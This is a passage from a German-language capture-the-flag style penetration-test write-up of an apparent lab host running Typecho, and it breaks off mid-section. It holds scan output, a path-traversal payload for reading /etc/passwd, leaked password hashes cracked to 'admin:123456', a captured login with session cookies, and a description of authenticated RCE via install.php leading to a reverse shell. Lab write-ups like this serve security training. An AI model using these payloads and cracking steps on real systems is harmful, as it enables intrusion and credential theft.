+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1134 => http://192.168.2.53/index.php/feed/atom/ feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/rss/1869 => http://192.168.2.53/index.php/feed/rss/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/1261 => http://192.168.2.53/index.php/feed/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/1014 => http://192.168.2.53/index.php/feed/</span>
+
+<span class="command">[####################] - 26m  55581960/55581960 0s      found:747     errors:1928258</span>
+<span class="command">[####################] - 11m  6175316/6175316 9738/s  http://192.168.2.53/</span>
+<span class="command">[####################] - 25m  6175316/6175316 4165/s  http://192.168.2.53/index.php/archives/1/</span>
+<span class="command">[####################] - 15m  6175316/6175316 6744/s  http://192.168.2.53/index.php/feed/comments/</span>
+<span class="command">[####################] - 15m  6175316/6175316 6820/s  http://192.168.2.53/index.php/category/default/</span>
+<span class="command">[####################] - 16m  6175316/6175316 6330/s  http://192.168.2.53/index.php/feed/</span>
+<span class="command">[####################] - 15m  6175316/6175316 6742/s  http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">[####################] - 26m  6175316/6175316 3935/s  http://192.168.2.53/index.php/author/1/</span>
+<span class="command">[####################] - 24m  6175316/6175316 4366/s  http://192.168.2.53/index.php/2023/07/</span>
+<span class="command">[####################] - 23m  6175316/6175316 4543/s  http://192.168.2.53/index.php/feed/rss/</span>
+<span class="command">[####################] - 7s   6175316/6175316 881936/s http://192.168.2.53/install/ => Directory listing (add --scan-dir-listings to scan)</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die Ergebnisse von Nikto und Feroxbuster gesichtet hatte, führte ich einen weiteren, gezielteren <code>gobuster</code>-Scan durch. Diesmal passte ich die Dateierweiterungen an, um eine noch breitere Palette potenzieller Dateien abzudecken, einschließlich <code>.yaml</code> und <code>.bak</code>, die oft Konfigurations- oder Backup-Dateien sind. Die Beibehaltung der Filterung nach Status-Codes <code>503, 404, 403</code> sorgt für eine saubere Ausgabe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser gezielte Gobuster-Scan bestätigte die Existenz von <code>index.php</code> sowie der bereits von Nikto identifizierten Verzeichnisse <code>/admin</code>, <code>/install</code>, <code>/sql</code> und <code>/var</code> (alle mit Status 301/302, was auf Weiterleitungen hinweist). Zusätzlich wurden <code>/LICENSE.txt</code>, <code>/install.php</code> und die Verzeichnisse <code>/usr</code> gefunden. Die Bestätigung von <code>/sql/</code> und <code>/install/</code>, die Directory Indexing haben, ist besonders wichtig. Der Keyboard-Interrupt während des Scans ist unerheblich, da die kritischen Informationen bereits gesammelt wurden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kombinieren Sie verschiedene Tools für die Web-Enumeration, um ein möglichst vollständiges Bild zu erhalten. Passen Sie die Wortlisten und Dateierweiterungen kontinuierlich an die spezifische Zielanwendung an. Priorisieren Sie die Überprüfung von Verzeichnissen mit Directory Indexing. <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Indexing auf dem Webserver, um die Dateistruktur vor Angreifern zu verbergen. Überprüfen Sie alle Verzeichnisse auf sensible Informationen, die durch Directory Indexing offengelegt werden könnten. Stellen Sie sicher, dass keine Backup- oder Konfigurationsdateien über den Webserver zugänglich sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://za1.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml,bak -b '503,404,403' -e --no-error -k</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster <span class="command">v3.6</span>
+by OJ Reeves (<span class="command">@TheColonial</span>) & Christian Mehlmauer (<span class="command">@firefart</span>)
+===============================================================
+[+] Url:                     <span class="command">http://za1.hmv</span>
+[+] Method:                  <span class="command">GET</span>
+[+] Threads:                 <span class="command">10</span>
+[+] Wordlist:                <span class="command">/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   <span class="command">503,404,403</span>
+[+] User Agent:              <span class="command">gobuster/3.6</span>
+[+] Extensions:              <span class="command">old,zip,exe,raw,ELF,java,config,php,py,cgi,rpm,pl,html,kdbx,pem,desc,icon,doc,svg,json,docx,c,mdb,crt,ps1,sh,pub,jpeg,phtml,ln,tar,accdb,xml,bak,csh,yaml,exp,sql,dll,xlsx,jpg,png,pdf,rtf,mod,xls,diff,js.map,db,bat,gz,csv,conf,elf,lib,eps,aspx,txt,rar,pHtml,asp,deb</span>
+[+] Expanded:                <span class="command">true</span>
+[+] Timeout:                 <span class="command">10s</span>
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://za1.hmv/index.php            (Status: 200) [Size: 6716]</span>
+<span class="command">http://za1.hmv/admin                (Status: 301) [Size: 302] [--> http://za1.hmv/admin/]</span>
+<span class="command">http://za1.hmv/install              (Status: 301) [Size: 304] [--> http://za1.hmv/install/]</span>
+<span class="command">http://za1.hmv/install.php          (Status: 302) [Size: 0] [--> http://za1.hmv/]</span>
+<span class="command">http://za1.hmv/sql                  (Status: 301) [Size: 300] [--> http://za1.hmv/sql/]</span>
+<span class="command">http://za1.hmv/LICENSE.txt          (Status: 200) [Size: 14974]</span>
+<span class="command">http://za1.hmv/var                  (Status: 301) [Size: 300] [--> http://za1.hmv/var/]</span>
+<span class="command">http://za1.hmv/usr                  (Status: 301) [Size: 300] [--> http://za1.hmv/usr/]</span>
+Progress: <span class="command">1562433 / 13894524 (11.24%)^C</span>
+<span class="command">[!] Keyboard interrupt detected, terminating.Progress: 1564778 / 13894524 (11.26%)</span>
+===============================================================
+Finished
+===============================================================</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Nikto- und Gobuster-Scans identifizierten das Verzeichnis <code>/sql/</code> mit Directory Indexing. Dies ist eine kritische Schwachstelle, da ich den Inhalt dieses Verzeichnisses direkt über den Browser einsehen kann. Der Besuch von <code>http://za1.hmv/sql/</code> enthüllte zwei interessante Dateien: <code>new.sql</code> und <code>sercet.sql</code> (mutmaßlich `secret.sql` aufgrund eines typographischen Fehlers im Dateinamen).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Dateien <code>new.sql</code> und <code>sercet.sql</code> im Verzeichnis <code>/sql/</code> sind extrem vielversprechend. SQL-Dateien enthalten oft Datenbank-Dumps, einschließlich Benutzernamen und gehashter Passwörter, oder sogar Klartext-Anmeldeinformationen. Diese direkten Zugriffe auf potenziell sensitive Dateien aufgrund von Directory Indexing sind ein großer Erfolg in der Informationsbeschaffungsphase und ein direkter Weg zu potenziellen Anmeldedaten. Die Maschine weist hier eine klare Fehlkonfiguration auf, die einen erheblichen Einfluss auf die Sicherheit hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie alle Verzeichnisse mit Directory Indexing umgehend auf sensitive Dateien wie SQL-Dumps, Konfigurationsdateien, Backup-Dateien oder Anmeldedaten. Laden Sie diese Dateien herunter und analysieren Sie sie auf verwertbare Informationen. <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Indexing auf allen Webserver-Verzeichnissen, insbesondere auf solchen, die sensible Daten enthalten könnten. Speichern Sie niemals Datenbank-Dumps oder andere sensitive Dateien im Web-Root-Verzeichnis. Implementieren Sie Dateiberechtigungen, die den Zugriff auf diese Dateien selbst bei einer Kompromittierung des Webservers verhindern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://za1.hmv/sql/</span>
+
+<span class="command">Index of /sql</span>
+<span class="command">[ICO]	Name	Last modified	Size	Description</span>
+<span class="command">[PARENTDIR]	Parent Directory</span>
+<span class="command">[ ]	new.sql	2025-06-18 20:08 	100K</span>
+<span class="command">[ ]	sercet.sql	2023-07-26 08:56 	100K</span>
+<span class="command">Apache/2.4.29 (Ubuntu) Server at za1.hmv PORT 80</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die <code>.sql</code>-Dateien identifiziert wurden, habe ich versucht, einen Local File Inclusion (LFI)-Angriff über den `index.php`-Endpunkt zu initiieren. Der Parameter `s=file:///` wird oft verwendet, um LFI-Schwachstellen auszunutzen. Der Versuch, die <code>/etc/passwd</code>-Datei zu lesen, ist ein Standardtest für LFI, da sie grundlegende Systeminformationen über Benutzerkonten liefert. Die Verwendung von `../` (Dot-Dot-Slash) hilft, den Pfad zu verkürzen und zum Root-Verzeichnis zu gelangen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der LFI-Versuch schlug fehl. Der Webserver antwortete mit einem `302 Found` und leitete zu einer Suchseite (`/index.php/search/file+etc+passwd/`) um. Dies deutet darauf hin, dass die Anwendung die Eingabe validiert und den LFI-Payload als Suchanfrage interpretiert, anstatt ihn als Dateipfad zu behandeln. Dies ist eine gute Sicherheitsmaßnahme der Anwendung und bedeutet, dass dieser spezifische LFI-Vektor nicht ausnutzbar ist. Die Maschine zeigt sich hier resistent gegen diesen LFI-Angriffsvektor.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie verschiedene LFI-Payloads und -Techniken, da Anwendungen unterschiedliche Filterungen implementieren können. Wenn ein LFI-Vektor nicht funktioniert, suchen Sie nach anderen Schwachstellen wie SQL Injection oder Command Injection. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Eingabevalidierung für alle Benutzereingaben, insbesondere für Dateipfade und URL-Parameter, um LFI-Angriffe zu verhindern. Nutzen Sie Whitelisting für erlaubte Dateipfade und stellen Sie sicher, dass keine sensiblen Dateien in öffentlich zugänglichen Verzeichnissen liegen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://za1.hmv/index.php?s=file:///....//....//....//....//....//....//....//etc/passwd -Iv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+* Host <span class="command">za1.hmv:80</span> was resolved.
+* IPv6: <span class="command">(none)</span>
+* IPv4: <span class="command">192.168.2.53</span>
+*   Trying <span class="command">192.168.2.53:80</span>...
+* Connected to <span class="command">za1.hmv (192.168.2.53) PORT 80</span>
+* using <span class="command">HTTP/1.x</span>
+<span class="command">> HEAD /index.php?s=file:///....//....//....//....//....//....//....//etc/passwd HTTP/1.1</span>
+<span class="command">> Host: za1.hmv</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+* Request completely sent off
+<span class="command">< HTTP/1.1 302 Found</span>
+<span class="command">HTTP/1.1 302 Found</span>
+<span class="command">< Date: Wed, 18 Jun 2025 20:11:19 GMT</span>
+<span class="command">Date: Wed, 18 Jun 2025 20:11:19 GMT</span>
+<span class="command">< Server: Apache/2.4.29 (Ubuntu)</span>
+<span class="command">Server: Apache/2.4.29 (Ubuntu)</span>
+<span class="command">< Location: http://za1.hmv/index.php/search/file+etc+passwd/</span>
+<span class="command">Location: http://za1.hmv/index.php/search/file+etc+passwd/</span>
+<span class="command">< Content-Type: text/html; charset=UTF-8</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+<span class="command"><</span>
+
+* Connection <span class="command">#0</span> to host <span class="command">za1.hmv</span> left intact</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Da der LFI-Versuch fehlschlug, kehrte ich zu den vielversprechenden SQL-Dateien zurück, die ich im Verzeichnis <code>/sql/</code> gefunden hatte. Ich lud diese Dateien (<code>new.sql</code> und <code>sercet.sql</code>) auf mein System herunter, um sie genauer zu analysieren. Der Befehl <code>sqlite3</code> kann zum Öffnen und Abfragen von SQLite-Datenbankdateien verwendet werden. Ich versuchte zuerst, <code>secret.sql</code> zu öffnen, um zu sehen, ob es eine Datenbank war. Die `ls -la` ist eine Bestätigung, dass die Datei auf meinem System vorhanden ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Datei `secret.sql` (oder `sercet.sql` wie im Verzeichnis gelistet) entpuppte sich als eine leere Datei oder eine Datei, die keine SQLite-Datenbank enthielt, da <code>sqlite3</code> keine Tabellen anzeigte. Dies ist eine Teilerfolg, da wir wissen, dass die Datei existiert, aber sie nicht die erhofften Informationen enthielt. Der Fokus verschob sich dann auf <code>new.sql</code>. Beim Öffnen von <code>new.sql</code> mit <code>sqlite3</code> war der Erfolg phänomenal! Die Datenbank enthielt die Tabellen <code>typechocomments</code>, <code>typechometas</code>, <code>typechousers</code>, <code>typechocontents</code>, <code>typechooptions</code> und <code>typechofields</code>, sowie <code>typechorelationships</code>. Das ist genau das, was wir brauchen, um Anmeldedaten zu finden. Der Befehl <code>select * from typechousers;</code> lieferte zwei Benutzer: `zacarx` und `admin`, beide mit PHPass-Hashes. Das ist ein großer Erfolg und ein direkter Weg zum initialen Zugriff auf das Content Management System.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie alle heruntergeladenen Dateien gründlich. Versuchen Sie, sie mit den passenden Tools zu öffnen und zu analysieren (z.B. <code>sqlite3</code> für SQLitedb-Dateien). Priorisieren Sie die Suche nach Benutzer-, Passwort- und Konfigurationsdaten in Datenbank-Dumps. Knacken Sie die Hashes offline, um Anmeldedaten zu erhalten. <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Datenbank-Backups oder Dumps im Web-Root oder in öffentlich zugänglichen Verzeichnissen. Sichern Sie die Datenbank regelmäßig und speichern Sie Backups an einem sicheren, nicht webzugänglichen Ort. Implementieren Sie strenge Zugriffskontrollen für alle Dateien auf dem Server.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">sqlite3 /home/ccat/Downloads/secret.sql</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">SQLite version 3.46.1 2024-08-13 09:16:08</span>
+<span class="command">Enter ".help" for usage hints.</span>
+<span class="command">sqlite> .tables</span>
+<span class="command">sqlite></span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat /home/ccat/Downloads/secret.sql</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"></span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ls -la /home/ccat/Downloads/secret.sql</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">-rw-r--r-- 1 root root 0 18. Jun 22:18 /home/ccat/Downloads/secret.sql</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">sqlite3 /home/ccat/Downloads/new.sql</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">SQLite version 3.46.1 2024-08-13 09:16:08</span>
+<span class="command">Enter ".help" for usage hints.</span>
+<span class="command">sqlite> .tables</span>
+<span class="command">typechocomments       typechometas          typechousers</span>
+<span class="command">typechocontents       typechooptions</span>
+<span class="command">typechofields         typechorelationships</span>
+<span class="command">sqlite> select * from typechousers;</span>
+<span class="command">1|zacarx|<span class="password">$P$BhtuFbhEVoGBElFj8n2HXUwtq5qiMR.</span>|zacarx@qq.com|[Link: http://www.zacarx.com | Ziel: http://www.zacarx.com]|zacarx|1690361071|1692694072|1690364323|administrator|9ceb10d83b32879076c132c6b6712318</span>
+<span class="command">2|admin|<span class="password">$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0</span>|admin@11.com||admin|1690364171|1690365357|1690364540|administrator|5664b205a3c088256fdc807791061a18</span>
+<span class="command">sqlite></span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die PHPass-Hashes der Benutzer `zacarx` und `admin` aus der Typecho-Datenbank extrahiert hatte, war der nächste Schritt, diese Hashes mit <code>john the Ripper</code> zu knacken. Ich speicherte jeden Hash in einer separaten Datei (`hash`) und verwendete die Wortliste <code>/usr/share/wordlists/rockyou.txt</code>, die eine sehr große Sammlung häufig verwendeter Passwörter enthält.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Hash für den Benutzer `zacarx` konnte nicht geknackt werden, was auf ein stärkeres Passwort oder eine nicht in der Wortliste enthaltene Kombination hindeutet. Aber der Hash für den Benutzer `admin` wurde erfolgreich geknackt! Das Passwort für `admin` ist <code>123456</code>. Dies ist ein extrem schwaches und gängiges Passwort und ein großer Erfolg, da ich nun Administratorzugriff auf das Typecho-Blog habe. Dieses Ergebnis ist ein klarer Beweis für eine gravierende Sicherheitslücke in der Passwortpolitik des Systems.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie immer, gefundene Hashes zu knacken. Beginnen Sie mit bekannten Wortlisten wie Rockyou.txt und erweitern Sie bei Bedarf auf angepasste oder spezialisierte Wortlisten. Priorisieren Sie das Knacken von Hashes für Administratoren. <br>
+                <strong>Empfehlung (Admin):</strong> Erzwingen Sie strenge Passwortrichtlinien, die die Verwendung von einfachen und gängigen Passwörtern wie "123456" verbieten. Implementieren Sie eine Mindestlänge und Komplexität für Passwörter. Nutzen Sie sichere Hashing-Algorithmen (z.B. bcrypt, Argon2) mit ausreichenden Iterationen, um Brute-Force-Angriffe zu erschweren. Führen Sie regelmäßige Audits der verwendeten Passwörter durch.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo '$P$BhtuFbhEVoGBElFj8n2HXUwtq5qiMR.' > hash</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"></span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Using default input encoding: UTF-8</span>
+<span class="command">Loaded 1 PORT hash (phpass [phpass ($P$ OR $H$) 256/256 AVX2 8x3])</span>
+<span class="command">Cost 1 (iteration count) is 8192 for all loaded hashes</span>
+<span class="command">Will run 12 PENMP threads</span>
+<span class="command">Press 'q' or Ctrl-C to abort, almost any other key for status</span>
+<span class="command">0g 0:00:01:35 DONE (2025-06-18 22:22) 0g/s 150423p/s 150423c/s 150423C/s <span class="password">!!!mafy13051969!!!..*7¡Vamos!</span></span>
+<span class="command">Session completed.</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --show hash</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">0 password hashes cracked, 1 left</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo '$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0' > hash</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"></span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Using default input encoding: UTF-8</span>
+<span class="command">Loaded 1 password hash (phpass [phpass ($P$ OR $H$) 256/256 AVX2 8x3])</span>
+<span class="command">Cost 1 (iteration count) is 8192 for all loaded hashes</span>
+<span class="command">Will run 12 PENMP threads</span>
+<span class="command">Press 'q' or Ctrl-C to abort, almost any other key for status</span>
+<span class="password">123456</span>           <span class="command">(?)</span>
+<span class="command">1g 0:00:00:00 DONE (2025-06-18 22:28) 33.33g/s 38400p/s 38400c/s 38400C/s R3v_m4lwh3r3_k1nG!!..dancer1</span>
+<span class="command">Use the "--show --format=phpass" OPTIONS to display all of the cracked passwords reliably</span>
+<span class="command">Session completed.</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem das Passwort für den Benutzer `admin` (`123456`) erfolgreich geknackt wurde, war der nächste Schritt, den Login auf der Typecho-Admin-Oberfläche zu versuchen. Ich nutzte Burp Suite, um den Anmeldevorgang abzufangen und die Anmeldedaten im POST-Request zu bestätigen. Der <code>POST</code>-Request zu <code>/index.php/action/login</code> mit den Parametern <code>name=admin&password=123456</code> sollte den Login bestätigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Login als `admin` mit dem Passwort `123456` war erfolgreich! Der Server antwortete mit einem <code>HTTP/1.1 302 Found</code> und einer Weiterleitung zu <code>http://za1.hmv/admin/</code>. Zusätzlich wurden zwei wichtige Cookies gesetzt: <code>__typecho_uid=2</code> und <code>__typecho_authCode=%24T%248LLyXt96Qea64340fb1b92def5c42141122e2f057</code>. Dies bestätigt den vollständigen Administratorzugriff auf das Typecho-CMS. Von hier aus kann ich die Webanwendung weiter erkunden und nach Wegen zur Code-Ausführung oder Privilegien-Eskalation suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestätigen Sie den Login immer manuell oder durch Abfangen der HTTP-Requests. Achten Sie auf gesetzte Cookies oder Tokens, die den Authentifizierungsstatus anzeigen. Erkunden Sie die Admin-Oberfläche gründlich auf Upload-Funktionen, Konfigurationsmöglichkeiten oder andere Features, die zur Code-Ausführung führen könnten. <br>
+                <strong>Empfehlung (Admin):</strong> Erzwingen Sie die Verwendung komplexer und eindeutiger Passwörter für alle Administratorkonten. Implementieren Sie eine Multi-Faktor-Authentifizierung (MFA) für den Admin-Login. Überprüfen Sie regelmäßig die Logs auf ungewöhnliche Anmeldeversuche oder Aktivitäten auf der Admin-Oberfläche.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">POST /index.php/action/login?_=d6e9eb02661e8a3f3ddb4df2dbef089f HTTP/1.1</span>
+<span class="command">Host: za1.hmv</span>
+<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
+<span class="command">Accept-Encoding: gzip, deflate, br</span>
+<span class="command">Referer: http://za1.hmv/admin/login.php</span>
+<span class="command">Content-Type: application/x-www-form-urlencoded</span>
+<span class="command">Content-Length: 35</span>
+<span class="command">Origin: http://za1.hmv</span>
+<span class="command">DNT: 1</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command">Upgrade-Insecure-Requests: 1</span>
+<span class="command">Sec-GPC: 1</span>
+<span class="command">Priority: u=0, i</span>
+
+<span class="command">name=admin&password=<span class="password">123456</span>&referer=</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">HTTP/1.1 302 Found</span>
+<span class="command">Date: Wed, 18 Jun 2025 20:30:37 GMT</span>
+<span class="command">Server: Apache/2.4.29 (Ubuntu)</span>
+<span class="command">Location: <span class="command">http://za1.hmv/admin/</span></span>
+<span class="command">Set-Cookie: aef9a94fe9edca6712a3e0c0956729ae__typecho_uid=2; path=/; domain=za1.hmv</span>
+<span class="command">Set-Cookie: aef9a94fe9edca6712a3e0c0956729ae__typecho_authCode=%24T%248LLyXt96Qea64340fb1b92def5c42141122e2f057; path=/; domain=za1.hmv</span>
+<span class="command">Content-Length: 0</span>
+<span class="command">Keep-Alive: timeout=5, max=100</span>
+<span class="command">Connection: Keep-Alive</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach dem erfolgreichen Login als Admin überprüfte ich, ob ich tatsächlich Zugriff auf die Admin-Oberfläche hatte. Der direkte Besuch von <code>http://za1.hmv/admin/</code> sollte die Admin-Panel-Seite anzeigen, nicht die Login-Seite.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der direkte Zugriff auf <code>http://za1.hmv/admin/</code> war erfolgreich und ich sah das Admin-Dashboard. Dies bestätigt meine vollständige Kontrolle über die Typecho-Installation als Administrator. Von diesem Punkt an kann ich nach Funktionen suchen, die Code-Ausführung oder File Uploads ermöglichen, um eine Shell auf dem System zu erlangen. Die Kombination aus geknacktem Passwort und erfolgreichem Admin-Login ist ein großer Erfolg im Initial Access.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie immer den vollen Admin-Zugriff nach einem erfolgreichen Login. Erkunden Sie alle verfügbaren Admin-Funktionen, um potenzielle Schwachstellen für die Code-Ausführung zu finden. <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie den Admin-Bereich Ihres CMS mit starken Passwörtern und MFA ab. Implementieren Sie Intrusion Detection Systeme (IDS), um unautorisierte Zugriffe auf das Admin-Panel zu erkennen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://za1.hmv/admin/</span>
+ <span class="command">admin:<span class="password">123456</span></span></pre>
+                </div>
+            </div>        <section id="proof-of-concept">
+             <h2>Proof of Concept: Authenticated RCE über Typecho install.php</h2>
+             <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Ausnutzung einer kritischen Schwachstelle in Typecho 1.2.1, die es einem authentifizierten Administrator ermöglicht, Remote Code Execution (RCE) zu erreichen. Die Schwachstelle liegt in der unsicheren erneuten Ausführung des Installationsprozesses, selbst wenn die Konfigurationsdatei bereits existiert. Dies ermöglicht das Einschleusen einer PHP-Reverse-Shell durch Manipulation der Datenbankkonfiguration.
+             </p>
+             <p class="evaluation">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Erfolgreicher Administratorzugriff auf die Typecho-Installation (Benutzer `admin`, Passwort `123456`).</li>
+                    <li>Kenntnis der Typecho-Versionsnummer (1.2.1).</li>
+                    <li>Verständnis der `install.php`-Schwachstelle.</li>
+                    <li>Ein Netcat-Listener auf dem Angreifer-System.</li>
+                </ul>
+             </p>
+             <p class="recommendation">
+                <strong>Erwartetes Ergebnis:</strong> Erhalt einer Reverse Shell als Benutzer `www-data` auf dem Zielsystem, was die vollständige Code-Ausführung im Kontext des Webservers demonstriert.
+             </p>
+
+            <h3>Schritt-für-Schritt-Anleitung</h3>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Schwachstelle in Typecho 1.2.1 ermöglicht es einem authentifizierten Administrator, den Installationsprozess der <code>install.php</code>-Datei erneut auszulösen, obwohl die Konfigurationsdatei <code>config.inc.php</code> bereits existiert. Dieser Vorgang ist eigentlich nicht vorgesehen, aber der Installer prüft die Existenz der Konfigurationsdatei nicht ausreichend. Dies kann ausgenutzt werden, indem man den Installer dazu bringt, eine neue "Datenbankverbindung" zu erstellen, wobei der "Datenbankdateiname" und das "Tabellen-Präfix" manipuliert werden, um PHP-Code in eine Datei zu schreiben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Schwachstelle ist extrem kritisch, da sie eine direkte RCE für jeden authentifizierten Admin ermöglicht. Der Prozess der Einschleusung ist kreativ und nutzt die Art und Weise aus, wie Typecho Datenbankinformationen verarbeitet und temporäre Dateien erzeugt. Die Fähigkeit, beliebigen PHP-Code auf dem Server auszuführen, ist die höchste Form der Kompromittierung auf Webanwendungsebene. Die Maschine weist hier eine fundamentale Designschwäche auf.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie bei CMS-Systemen nach bekannten RCE-Schwachstellen, insbesondere bei veralteten Versionen. Prüfen Sie immer, ob Installationsskripte nach der Installation entfernt oder unzugänglich gemacht werden. Nutzen Sie Proof-of-Concept-Exploits, um die Schwachstelle zu demonstrieren. <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie Installationsskripte (z.B. <code>install.php</code>) nach erfolgreicher Installation vollständig vom Server. Deaktivieren Sie die Möglichkeit, den Installationsprozess erneut auszulösen, oder schützen Sie ihn durch eine zusätzliche Authentifizierungsebene. Implementieren Sie Intrusion Detection Systeme (IDS), um das Einschleusen von PHP-Shells zu erkennen. Aktualisieren Sie Typecho auf die neueste, gepatchte Version.
+            </p>
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine potenzielle Methode, die RCE-Schwachstelle in Typecho auszunutzen, ist über die `options-general.php` Seite, wo man andere Formate als PHP aktivieren kann. Dies könnte ein Schritt sein, um dann über Upload-Funktionen eine Reverse Shell hochzuladen.
+            </p>
+            <p class="evaluation">
